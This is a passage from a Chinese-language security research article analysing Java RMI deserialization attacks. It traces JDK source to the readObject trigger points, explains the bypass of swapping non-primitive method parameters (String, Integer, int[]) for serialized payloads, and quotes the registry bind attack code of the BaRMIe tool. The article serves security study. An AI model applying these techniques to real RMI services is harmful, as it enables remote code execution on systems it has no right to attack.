+<p><a id="img8" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120528-9bdaf4ca-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120528-9bdaf4ca-b43d-1.png"></a></p>
+<p>对比下服务端分析处的：（服务端调试时，显示的是10进制Long型，写个小DEMO，我们把它调为16进制来对比下）</p>
+<p><a id="img9" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120540-a2e09842-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120540-a2e09842-b43d-1.png"></a></p>
+<p>跟我们wireshark获取的完全一致（当然了....）但是这个Method hash，与上面服务端自己实现的method hash map中的值均不符，于是，强行把<code>name(java.lang.String)</code>的方法接口写成<code>name(java.lang.Object)</code>来无中生有一个Object，会因为服务端没有我们传输过去的method hash而失败。</p>
+<p>啊噢，脑洞失败。</p>
+<p>但是<strong>第二个脑洞</strong>：我们既然都抓到数据包了，反正理论上我们客户端生成的数据包我们可以随意控制，我们可以在method hash的位置正常写一个服务端有的method hash，就可以通过method hash校验了。但是然后传输的参数继续写成Object形式这样可以么？</p>
+<p>继续看源码，顺路看看判断这个脑洞可以不，<code>sun.rmi.server.UnicastServerRef#dispatch</code>紧接着上面method hash判定</p>
+<div class="highlight"><pre><span></span><span class="k">this</span><span class="o">.</span><span class="na">logCall</span><span class="o">(</span><span class="n">var1</span><span class="o">,</span> <span class="n">var8</span><span class="o">);</span>
+<span class="c1">//var8 是在hashToMethod_Map中用客户端传输过来的method hash查询到的RMI服务端实现的Method类型</span>
+<span class="c1">//获取Method中的入参</span>
+<span class="n">Class</span><span class="o">[]</span> <span class="n">var9</span> <span class="o">=</span> <span class="n">var8</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">();</span>
+<span class="c1">//获取入参个数，等会拿来存储反序列化结果</span>
+<span class="n">Object</span><span class="o">[]</span> <span class="n">var10</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">var9</span><span class="o">.</span><span class="na">length</span><span class="o">];</span>
+
+<span class="k">try</span> <span class="o">{</span>
+    <span class="c1">//这边是JDK提供给开发者自定义的解析部分，默认是一个空函数</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">unmarshalCustomCallData</span><span class="o">(</span><span class="n">var40</span><span class="o">);</span>
+    <span class="c1">//遍历入参类型</span>
+    <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var11</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var11</span> <span class="o">&lt;</span> <span class="n">var9</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">var11</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">//**关键函数**：unmarshaValue(入参类型，传输数据包)</span>
+        <span class="c1">//这里开始根据 入参类型（var9[var11]） 反序列化 传输过来的序列化入参，然后反序列化结果给var10</span>
+        <span class="n">var10</span><span class="o">[</span><span class="n">var11</span><span class="o">]</span> <span class="o">=</span> <span class="n">unmarshalValue</span><span class="o">(</span><span class="n">var9</span><span class="o">[</span><span class="n">var11</span><span class="o">],</span> <span class="n">var40</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var33</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var33</span><span class="o">);</span>
+<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">var34</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var34</span><span class="o">);</span>
+<span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+    <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+<span class="o">}</span>
+</pre></div>
+<p>上面说到第二个脑洞：关注<strong>unmarshalValue(var9[var11], var40);</strong></p>
+<ul>
+<li>这里我们客户端传输的Object类型恶意参数在var40中</li>
+<li>入参类型（var9[var11]）是服务器本地RMI服务Method的设定参数类型</li>
+</ul>
+<p>这里的处理是没问题的，用本地的Method设定的参数类型去读取客户端提供的输入流。</p>
+<p>继续跟进<code>sun.rmi.server.UnicastRef#unmarshalValue</code></p>
+<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unmarshalValue</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">var0</span><span class="o">,</span> <span class="n">ObjectInput</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+    <span class="c1">//var0 是服务端Method设定的入参参数类型</span>
+    <span class="c1">//var1 是传输从客户端来的的序列化数据流</span>
+    <span class="c1">//var0.isPrimitive 判断是否是默认基础类型</span>
+    <span class="c1">//需要注意基础类型!=下面这些TYPE，我们在之后解释这个坑</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var0</span><span class="o">.</span><span class="na">isPrimitive</span><span class="o">())</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readBoolean</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Byte</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readByte</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Character</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readChar</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Short</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readShort</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Long</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readLong</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Float</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readFloat</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Double</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readDouble</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">Error</span><span class="o">(</span><span class="s">"Unrecognized primitive type: "</span> <span class="o">+</span> <span class="n">var0</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="c1">//将从客户端传输过来的序列化数据流进行readObject</span>
+        <span class="c1">//**反序列化执行处**</span>
+        <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>这里<code>var1.readObject();</code>就是<strong>反序列化</strong>我们的Object payload参数的地方。</p>
+<p>到这里我们利用Object的类型参数传输payload的漏洞触发点就跟完了，主要就以下步骤</p>
+<ol>
+<li>根据传输过来的Method hash，判断本地提供的RMI服务类的方法是否有这个Method hash</li>
+<li>根据Method hash取到Method类，遍历入参，从输入流按顺序反序列化入参</li>
+<li>当服务端设定的RMI方法的入参<strong>不是基础数据类型</strong>时，执行<code>var1.readObject</code>就会触发我们的payload</li>
+</ol>
+<h3 id="toc-7">绕过Object类型参数</h3>
+<p>上面我们也在一直开脑洞，想要扩大影响范围，但一路分析下来好像看似没什么办法。但是好像有一个地方可以注意到：当服务端设定的RMI方法的入参<strong>不是基础数据类型</strong>时，就会执行反序列化输入流。这里并不强求是要Object类型的参数才能<code>var1.readObject</code>。</p>
+<p>这里看似没问题，但是你细品：</p>
+<p>假如服务端的RMI方法接口的入参是<code>name(java.lang.String)</code>（<strong>String不在基础数据类型表中</strong>）；那么它就会进入else分支，执行<code>var1.readObject();</code>，但是<code>var1</code>又是我们客户端输出的值，假如我们输入的<strong>不是一个<code>java.lang.String</code>的值</strong>，而是一个<strong>Object对象</strong>，那么实际上也会被反序列化解析，即<code>Object.readObject();</code>完成任意命令执行。</p>
+<p>那么：<strong>RMI服务端需要起一个具有Object参数的RMI方法</strong> 的利用条件限制 就扩展到了 <strong>RMI服务端只需要起一个具有不属于基础数据类型参数的RMI方法</strong>（比如String啥的）</p>
+<p><strong>攻击原理核心</strong>在于替换原本不是Object类型的参数变为Object类型。之前我们修改String接口变为Object，是可以做到修改参数类型，但是那样还会修改method hash。所以这里只能修改底层代码，去替换原本的参数为我们想要的payload。</p>
+<p>afanti总结了以下途径（后发现是<a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank">国外老哥</a>先提出来的）：</p>
+<ol>
+<li>直接修改rmi底层源码</li>
+<li>在运行时，添加调试器hook客户端，然后替换</li>
+<li>在客户端使用Javassist工具更改字节码</li>
+<li>使用代理，来替换已经序列化的对象中的参数信息</li>
+</ol>
+<p>途径不同，目的都是一样的，我们使用afanti的<a href="https://github.com/Afant1/RemoteObjectInvocationHandler" target="_blank">RemoteObjectInvocationHandler</a>来试验下可行性。</p>
+<p>RMI服务端改成提供一个String参数为接口的方法：<code>say(String say)</code></p>
+<p>修改<code>afanti.rasp.visitor.RemoteObjectInvocationHandlerHookVisitor.RemoteObjectInvocationHandlerHookVisitorAdapter#onMethodEnter</code>下的DNS地址为自己的，然后打包成jar。</p>
+<p>设置VM options</p>
+<p><a id="img10" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120601-af10ff12-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120601-af10ff12-b43d-1.png"></a></p>
+<p>Server调试一下，断点下在入参判断处，然后客户端直接运行。</p>
+<p><a id="img11" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120609-b449cc20-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120609-b449cc20-b43d-1.png"></a></p>
+<p>可以看到入参类型为String，但是var1中是Object类型的URLDNS payload</p>
+<p>到URLDNS的触发末端下个断点看看<code>java.net.URLStreamHandler#hashCode</code>，已经执行到这了，证明OK。（其实是由于再写文章的时候CEYE莫名其妙挂了，就不补图惹，不了解URLDNS原理的可以看<a href="https://www.anquanke.com/post/id/201762#h3-7" target="_blank">这里</a>）</p>
+<p><a id="img12" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120621-bb5e6048-b43d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622120621-bb5e6048-b43d-1.png"></a></p>
+<p>其实我们回看<a href="https://github.com/NickstaDB/BaRMIe" target="_blank">BaRMIe</a>，会发现在其README.md文档中已经对于该类型绕过进行了说明（可能这就是大佬吧.jpg）：</p>
+<blockquote><p>3.通过非法的方法调用进行反序列化攻击</p>
+<p>由于在服务器上对于客户端传入参数序列化的同时对于方法的参数并没有进行匹配检查。我们可以使用具有非原始参数类型的任何方法作为反序列化攻击的入口点。BaRMIe通过使用TCP代理在网络级别修改方法参数来实现这一点，实际上触发了非法的方法调用。下面是一些易受攻击方法的示例：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">);</span>
+<span class="kd">public</span> <span class="n">Long</span> <span class="nf">add</span><span class="o">(</span><span class="n">Integer</span> <span class="n">i1</span><span class="o">,</span> <span class="n">Integer</span> <span class="n">i2</span><span class="o">);</span>
+<span class="kd">public</span> <span class="kt">void</span> <span class="nf">sum</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">values</span><span class="o">);</span>
+</pre></div>
+<p>当方法调用通过代理时，这些方法的参数可以替换为反序列化负载。此攻击是可能的，因为Java在反序列化之前不会尝试验证通过网络接收的远程方法参数是否与实际参数类型兼容。</p>
+</blockquote>
+<p>这里提到<strong>Integer参数</strong>也是可以利用的，但是想想不科学呀，Integer不是在if为true的情况下么？我们回看下</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">(</span><span class="n">var0</span><span class="o">.</span><span class="na">isPrimitive</span><span class="o">())</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">)</span> <span class="o">{</span><span class="c1">//这里</span>
+        <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>
+        <span class="c1">//...</span>
+</pre></div>
+<p>查一下<a href="http://www.51gjie.com/java/778.html" target="_blank">isPrimitive()</a>是判断是否为基本类，包括基本类型boolean、char、byte、short、int、long、float、double。而Integer是int的封装类，不是一个基本类，所以Interger的参数也可以？</p>
+<p>试一试：</p>
+<p><a id="img13" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135809-59681c0c-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135809-59681c0c-b44d-1.png"></a></p>
+<p>还真的会到else中......</p>
+<p>这里有一个非常坑的烟雾弹，那就是下面的<strong>Integer.TYPE</strong>，真的会很自然的以为Integer.TYPE就是Integer类，那么包括integer类下面的这些类都不行，而实际上<strong>Integer.TYPE</strong>不是Integer类是基础类<strong>int</strong>！！！！！</p>
+<p><a id="img14" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135819-5f4e6068-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135819-5f4e6068-b44d-1.png"></a></p>
+<p>那么我们也就可以理解为啥<strong>参数为Integer</strong>是可以的了，因为Integer  !=i nt，不是基础类。</p>
+<p>再顺手来验证下<strong>int[]</strong>吧</p>
+<p><a id="img15" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135834-685c4e90-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135834-685c4e90-b44d-1.png"></a></p>
+<p>也进入else，数组的class竟然长这样 因垂丝汀。最后看一个不行的int类型：</p>
+<p><a id="img16" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135845-6ebc80c0-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135845-6ebc80c0-b44d-1.png"></a></p>
+<blockquote><p>这里截图是去掉替换成payload的jar包看到的结果，替换成payload后其实不到这里就会报错退出，没有细究应该是payload的问题。</p>
+</blockquote>
+<p>那么至此我们也就知道：<strong>假如服务端起一个RMI服务，只要提供了非基础类的参数接口，我们都可以对其进行反序列化攻击。</strong></p>
+<p>在相关文章中总结的：</p>
+<ul>
+<li>Bypass JEP290攻击rmi的 <strong>即使暴露的函数非Object参数类型的，也是可以被攻击的。</strong></li>
+<li>RMI漏洞的另一种利用方式的 <strong>如果暴露的函数无Object类型参数，那么就需要动态替换rmi通讯时候函数参数的值</strong></li>
+</ul>
+<p>感觉都会有些误导说让人迷糊的觉得所有参数都可以，可能是因为这个太简单了？？</p>
+<p>回到Barmie工具，它虽然提出了这个绕过Object调用的利用方式，但是是没有为其提供攻击模块。</p>
+<p>想想也正常，这个绕过其实在实际场景中也同样有一个鸡肋的前提，客户端要知道服务端起服务的接口以及调用方式，即a.b(c)。</p>
+<p>实际利用还是太难了。</p>
+<h2 id="toc-8">RMI服务端反序列化攻击RMI注册端</h2>
+<p>上边讲述的三类攻击方式，讨论的人挺少，因为在实际中确实挺鸡肋的，但是搞搞清楚也算有趣。</p>
+<p>接下来就是比较通用的攻击情景了：攻击者模拟RMI服务端攻击RMI注册端</p>
+<p>我们先来看看RMI服务端的漏洞触发点代码：<code>/rt.jar!/sun/rmi/server/UnicastServerRef.class#RegistryImpl_Skel</code></p>
+<blockquote><p>环境：RMI-Server ServerAndRegister 分析</p>
+<p>jdk:1.7u80</p>
+<p>jdk7u80版本这个地方在调试<code>RegistryImpl_Skel.class</code>这个神奇的文件的时候有一个非常有趣而坑爹的情况，那就是这个class压根没法调试。百思不得其解，去下了openjdk 的jdk源码，发现源码中根本没有这个<code>RegistryImpl_Skel.java</code>文件。</p>
+<p>跟wh1tp1g讨论了下，应该是一个动态生成的class，所以不能调试。然后非常神奇在jdk8版本的8u112也不能调试，但是8u141之后又可以了。如果有想自己调试的同学可以注意下这个点。</p>
+</blockquote>
+<p><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>（我们可以叫做RMI注册任务分发处，就是注册端处理请求的地方）其实是从<code>sun.rmi.server.UnicastServerRef#dispatch</code>（RMI请求分发处）那边过来的。</p>
+<p>由于RegistryImpl_Skel不能下断点，我们在bind函数执行处<code>sun.rmi.registry.RegistryImpl#bind</code>下一个断点，直接运行，就可以得到调用栈，再回去找就好了。</p>
+<p><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">dispatch</span><span class="o">(</span><span class="n">Remote</span> <span class="n">var1</span><span class="o">,</span> <span class="n">RemoteCall</span> <span class="n">var2</span><span class="o">,</span> <span class="kt">int</span> <span class="n">var3</span><span class="o">,</span> <span class="kt">long</span> <span class="n">var4</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="c1">//一处接口hash验证</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">var4</span> <span class="o">!=</span> <span class="mi">4905912898345647071L</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">SkeletonMismatchException</span><span class="o">(</span><span class="s">"interface hash mismatch"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="c1">//设定变量开始处理请求</span>
+            <span class="c1">//var6为RegistryImpl对象，调用的就是这个对象的bind、list等方法</span>
+            <span class="n">RegistryImpl</span> <span class="n">var6</span> <span class="o">=</span> <span class="o">(</span><span class="n">RegistryImpl</span><span class="o">)</span><span class="n">var1</span><span class="o">;</span>
+            <span class="c1">//接受客户端输入流的参数变量</span>
+            <span class="n">String</span> <span class="n">var7</span><span class="o">;</span>
+            <span class="n">Remote</span> <span class="n">var8</span><span class="o">;</span>
+            <span class="n">ObjectInput</span> <span class="n">var10</span><span class="o">;</span>
+            <span class="n">ObjectInput</span> <span class="n">var11</span><span class="o">;</span>
+            <span class="c1">//var3表示对应的方法值0-4，这个数字是跟RMI客户端约定好的</span>
+            <span class="c1">//比如RMI客户端发送bind请求：就是sun.rmi.registry.RegistryImpl_Stub#bind中的这一句</span>
+            <span class="c1">//super.ref.newCall(this, operations, 0, 4905912898345647071L);</span>
+            <span class="k">switch</span><span class="o">(</span><span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">//统一删除了try等语句</span>
+            <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+                    <span class="c1">//bind(String,Remote)分支</span>
+                    <span class="n">var11</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">//1.反序列化触发处</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">var11</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var8</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="n">var11</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var6</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="n">var7</span><span class="o">,</span> <span class="n">var8</span><span class="o">);</span>
+            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+                    <span class="c1">//list()分支</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+                    <span class="n">String</span><span class="o">[]</span> <span class="n">var97</span> <span class="o">=</span> <span class="n">var6</span><span class="o">.</span><span class="na">list</span><span class="o">();</span>
+                    <span class="n">ObjectOutput</span> <span class="n">var98</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getResultStream</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="n">var98</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var97</span><span class="o">);</span>
+
+            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+                  <span class="c1">//lookup(String)分支</span>
+                    <span class="n">var10</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">//2.反序列化触发处</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">var10</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var8</span> <span class="o">=</span> <span class="n">var6</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">var7</span><span class="o">);</span>
+
+            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+                  <span class="c1">//rebind(String,Remote)分支</span>
+                    <span class="n">var11</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">//3.反序列化触发处</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">var11</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var8</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="n">var11</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var6</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="n">var7</span><span class="o">,</span> <span class="n">var8</span><span class="o">);</span>
+
+            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+                    <span class="c1">//unbind(String)分支</span>
+                    <span class="n">var10</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">//4.反序列化触发处</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">var10</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var6</span><span class="o">.</span><span class="na">unbind</span><span class="o">(</span><span class="n">var7</span><span class="o">);</span>
+            <span class="k">default</span><span class="o">:</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"invalid method number"</span><span class="o">);</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>可以得到4个反序列化触发处：<strong>lookup</strong>、<strong>unbind</strong>、<strong>rebind</strong>、<strong>bind</strong>。</p>
+<h4>RMI客户端角度的lookup攻击RMI注册端</h4>
+<blockquote><p>其中lookup是以客户端的角度攻击，但是其原理与以服务端角度攻击的bind，rebind，unbind完全一致。我们会在最后的罗列中把lookup区分开，不再领出来细说。</p>
+<p>此处建立一个小标题，作为提醒</p>
+</blockquote>
+<p>这里可能会有一个疑问：<br>
+<strong>4个接口有两类参数，String和Remote类型的Object，那么是不是我们只能攻击必须要是Remote类型的Object接口呢？即实际上只有bind、rebind接口才是可以攻击的？</strong></p>
+<p>之所以会产生这个疑问是由于 有些文章会说替换Remote类型的参数为payload 或者 我们看Ysoserial的payload的构造过程也是构造出一个Remote类型的payload Object，再把正常的Remote参数替换为Remote类型的payload，这些都给我们一种只有Remote参数才能反序列化的假象</p>
+<p>虽然我们看到RMI注册端的解析过程是直接反序列化传参，看样子String和Remote的参数位置都是可以的，但还是会摇摆不定。</p>
+<p>但事实是 <strong>RMI注册端没有任何校验，你的payload放在Remote参数位置可以攻击成功，放在String参数位置也可以攻击成功</strong>。<br>
+而之所以Ysoserial生成payload要变成Remote格式，是因为RMI服务端发这个数据包的流程中会需要这个对象是Remote类型的，我们之后将证明，并且详细说明。</p>
+<h3 id="toc-9">Barmie - Bind</h3>
+<p>各个工具都对于服务端打注册端的bind攻击写了exploit，相对于上面攻击形式，bind攻击更具备通用性。</p>
+<p>Barmie对于Bind接口有探测和攻击两个模块</p>
+<p>简单总结一下探测模块：<code>nb.barmie.modes.attack.attacks.Java.IllegalRegistryBind#canAttackEndpoint</code></p>
+<ol>
+<li>新建一个RMI代理服务器，在这个代理服务器中会对输出的数据包进行重新构造</li>
+<li>获取这个RMI对象，调用其bind方法</li>
+<li>重构客户端输出的数据包，改变其内容为预设好的一个Object</li>
+<li>服务端肯定会报错（由于我们预设的Object不会被正确解析执行），根据服务端返回报错栈，去匹配是否有<code>filter status: REJECTED</code>字符串来判断，对方的JDK版本我们是否可以攻击。（这个字符串是JEP290拦截导致的，之后我们会提到）</li>
+<li>如果没有匹配到就说明可以攻击。</li>
+</ol>
+<p>再来详细看看流程比较相似的攻击模块<code>nb.barmie.modes.attack.attacks.Java.IllegalRegistryBind#executeAttack</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">executeAttack</span><span class="o">(</span><span class="n">RMIEndpoint</span> <span class="n">ep</span><span class="o">,</span> <span class="n">DeserPayload</span> <span class="n">payload</span><span class="o">,</span> <span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">BaRMIeException</span> <span class="o">{</span>
+    <span class="n">RMIBindExploitProxy</span> <span class="n">proxy</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span><span class="c1">//代理器</span>
+    <span class="n">Registry</span> <span class="n">reg</span><span class="o">;</span>
+    <span class="c1">//已删去try部分</span>
+    <span class="c1">//1.初始化一个bind RMI注册端代理器</span>
+    <span class="c1">//我们的payload从这里给入</span>
+    <span class="n">proxy</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RMIBindExploitProxy</span><span class="o">(</span><span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="n">ep</span><span class="o">.</span><span class="na">getEndpoint</span><span class="o">().</span><span class="na">getHost</span><span class="o">()),</span> <span class="n">ep</span><span class="o">.</span><span class="na">getEndpoint</span><span class="o">().</span><span class="na">getPort</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">_options</span><span class="o">,</span> <span class="n">payload</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span> <span class="mi">0</span><span class="o">));</span>
+    <span class="n">proxy</span><span class="o">.</span><span class="na">startProxy</span><span class="o">();</span>
+
+    <span class="c1">//2.从RMI注册端代理器获取一个注册端对象</span>
+    <span class="n">reg</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="n">proxy</span><span class="o">.</span><span class="na">getServerListenAddress</span><span class="o">().</span><span class="na">getHostAddress</span><span class="o">(),</span> <span class="n">proxy</span><span class="o">.</span><span class="na">getServerListenPort</span><span class="o">());</span>
+
+    <span class="c1">//3.通过RMI注册端代理器调用bind，修改参数为给定的payload</span>
+    <span class="c1">//reg.bind(随机字符串,一个接口需要的Remote接口)</span>
+    <span class="c1">//但是经过注册端代理器之后，这里的参数会被改为：bind(PAYLOAD, null)，没错payload是String的位置</span>
+    <span class="n">reg</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">generateRandomString</span><span class="o">(),</span> <span class="k">new</span> <span class="n">BaRMIeBindExploit</span><span class="o">());</span>
+<span class="o">}</span>
+
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">BaRMIeBindExploit</span> <span class="kd">implements</span> <span class="n">Remote</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
+<span class="o">}</span>
+</pre></div>
+<p>最后形成的调用是<code>bind(PAYLOAD, null)</code><br>
